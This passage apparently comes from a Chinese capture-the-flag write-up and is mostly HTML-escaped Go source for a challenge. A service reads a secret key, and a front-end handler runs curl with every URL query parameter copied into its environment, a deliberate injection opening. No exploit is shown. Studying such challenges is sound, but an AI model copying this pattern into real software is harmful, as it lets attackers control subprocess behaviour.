&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">t&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#75af00">s&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">continue&lt;/span> &lt;span style="color:#75715e">// 如果下一个字符ascii==上一个字符 则继续
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">t&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">t&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#75af00">s&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">file&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">os&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;secret/key&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">nil&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">panic&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">defer&lt;/span> &lt;span style="color:#75af00">file&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Close&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">content&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">ioutil&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">ReadAll&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">file&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">SecretKey&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#111">string&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">content&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">HandleFunc&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">getToken&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">HandleFunc&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/manage&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">manage&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;start listen 9091&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">ListenAndServe&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;:9091&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">nil&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e">// 监听端口 9091
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">nil&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Fatal&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ListenAndServe: &amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>web服务，对外访问&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-go" data-lang="go">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#75af00">main&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;bytes&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;crypto/md5&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;encoding/json&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;fmt&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;io&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;io/ioutil&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;log&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;math/rand&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;net/http&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;os&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;os/exec&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;path/filepath&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;strings&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">SecretKey&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">type&lt;/span> &lt;span style="color:#75af00">TokenResult&lt;/span> &lt;span style="color:#00a8c8">struct&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">Success&lt;/span> &lt;span style="color:#00a8c8">string&lt;/span> &lt;span style="color:#75af00">json&lt;/span>&lt;span style="color:#111">:&lt;/span>&lt;span style="color:#d88200">&amp;#34;success&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">Failed&lt;/span> &lt;span style="color:#00a8c8">string&lt;/span> &lt;span style="color:#75af00">json&lt;/span>&lt;span style="color:#111">:&lt;/span>&lt;span style="color:#d88200">&amp;#34;failed&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">letterBytes&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">RandStringBytes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">n&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">string&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">b&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#111">make&lt;/span>&lt;span style="color:#111">([]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">n&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#00a8c8">range&lt;/span> &lt;span style="color:#75af00">b&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">b&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#75af00">letterBytes&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Intn&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">letterBytes&lt;/span>&lt;span style="color:#111">))]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">string&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">b&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">getToken&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">w&lt;/span> &lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">ResponseWriter&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">r&lt;/span> &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Request&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">values&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">r&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">URL&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Query&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fromHostList&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">strings&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Split&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">r&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">RemoteAddr&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;:&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e">// 获取来源ip
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">fromHost&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">fromHostList&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fromHost&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#75af00">fromHostList&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">r&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Header&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Set&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Fromhost&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">fromHost&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">command&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">exec&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Command&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;curl&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;-H&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;Fromhost: &amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#75af00">fromHost&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;127.0.0.1:9091&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e">// 本地curl访问9091
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#75af00">k&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">_&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#00a8c8">range&lt;/span> &lt;span style="color:#75af00">values&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">command&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Env&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">command&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Env&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">fmt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Sprintf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;%s=%s&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">k&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">values&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">k&lt;/span>&lt;span style="color:#111">)))&lt;/span> &lt;span style="color:#75715e">//获取环境变量 将参数键值对形式设为环境变量
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">outinfo&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">bytes&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Buffer&lt;/span>&lt;span style="color:#111">{}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">outerr&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">bytes&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Buffer&lt;/span>&lt;span style="color:#111">{}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">command&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Stdout&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>&lt;span style="color:#75af00">outinfo&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">command&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Stderr&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>&lt;span style="color:#75af00">outerr&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">command&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Start&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// res := &amp;#34;ERROR&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">nil&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fmt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Println&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Error&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">TokenResult&lt;/span>&lt;span style="color:#111">{}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#75af00">command&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Wait&lt;/span>&lt;span style="color:#111">();&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">nil&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Failed&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#75af00">outerr&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">String&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Success&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#75af00">outinfo&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">String&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">msg&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">_&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">json&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Marshal&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">w&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Write&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">msg&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">type&lt;/span> &lt;span style="color:#75af00">ListFileResult&lt;/span> &lt;span style="color:#00a8c8">struct&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">Files&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">string&lt;/span> &lt;span style="color:#75af00">json&lt;/span>&lt;span style="color:#111">:&lt;/span>&lt;span style="color:#d88200">&amp;#34;files&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 查看当前 token 下的文件
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">listFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">w&lt;/span> &lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">ResponseWriter&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">r&lt;/span> &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Request&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">values&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">r&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">URL&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Query&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">token&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">values&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;token&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fromHostList&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">strings&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Split&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">r&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">RemoteAddr&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;:&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fromHost&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
